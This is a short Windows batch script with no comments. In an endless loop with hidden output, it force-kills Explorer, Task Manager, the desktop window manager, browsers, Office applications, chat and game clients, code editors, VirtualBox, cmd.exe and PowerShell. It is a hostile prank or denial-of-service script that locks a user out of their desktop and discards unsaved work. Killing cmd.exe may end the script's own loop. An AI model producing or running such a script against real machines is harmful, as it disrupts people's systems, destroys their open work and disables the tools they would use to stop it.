@echo off
:killloop
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im notepad.exe >nul 2>&1
taskkill /f /im calc.exe >nul 2>&1
taskkill /f /im mspaint.exe >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im write.exe >nul 2>&1
taskkill /f /im winword.exe >nul 2>&1
taskkill /f /im excel.exe >nul 2>&1
taskkill /f /im powerpnt.exe >nul 2>&1
taskkill /f /im outlook.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im firefox.exe >nul 2>&1
taskkill /f /im brave.exe >nul 2>&1
taskkill /f /im discord.exe >nul 2>&1
taskkill /f /im steam.exe >nul 2>&1
taskkill /f /im steamwebhelper.exe >nul 2>&1
taskkill /f /im Spotify.exe >nul 2>&1
taskkill /f /im Code.exe >nul 2>&1
taskkill /f /im devenv.exe >nul 2>&1
taskkill /f /im git-bash.exe >nul 2>&1
taskkill /f /im VBoxSVC.exe >nul 2>&1
taskkill /f /im VirtualBox.exe >nul 2>&1
taskkill /f /im taskhost.exe >nul 2>&1
taskkill /f /im dwm.exe >nul 2>&1
taskkill /f /im cmd.exe >nul 2>&1
taskkill /f /im powershell.exe >nul 2>&1
timeout /t 1 /nobreak >nul
goto killloop
